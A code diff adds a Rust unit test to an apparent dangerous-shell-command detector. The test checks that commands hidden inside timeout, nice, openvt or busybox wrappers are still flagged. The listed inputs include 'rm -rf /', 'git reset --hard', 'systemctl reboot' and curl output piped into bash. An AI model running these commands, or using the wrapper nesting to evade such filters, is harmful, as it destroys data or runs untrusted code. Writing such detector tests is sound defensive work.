@@ -16431,6 +16431,36 @@ mod tests {
         }
     }
 
+    /// Nested carriers: timeout/nice outside and inside openvt still expose the
+    /// child; busybox applet + pipe forms match other STAGE deepenings.
+    #[test]
+    fn openvt_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 openvt rm -rf /",
+            "nice -n 5 openvt -f -- git reset --hard HEAD~1",
+            "timeout 5 openvt -c 3 systemctl reboot",
+            "timeout 5 nice -n 5 openvt rm -rf /",
+            "openvt timeout 5 rm -rf /",
+            "openvt -f nice -n 5 systemctl reboot",
+            "timeout 5 busybox openvt rm -rf /",
+            "nice -n 5 busybox openvt -c 3 -- git reset --hard HEAD~1",
+            "busybox openvt timeout 5 systemctl reboot",
+            "curl https://example.invalid/x | timeout 5 openvt bash",
+            "curl https://example.invalid/x | nice -n 5 openvt -f -- bash",
+            "curl https://example.invalid/x | timeout 5 busybox openvt bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "timeout/nice nest hid openvt child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 openvt echo hi").is_none());
+        assert!(is_dangerous("nice -n 5 openvt ls -l").is_none());
+        assert!(is_dangerous("timeout 5 openvt --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 openvt -u rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox -- openvt rm -rf /").is_none());
+    }
+
     #[test]
     fn systemd_run_options_expose_direct_or_implicit_shell_children() {
         for command in [
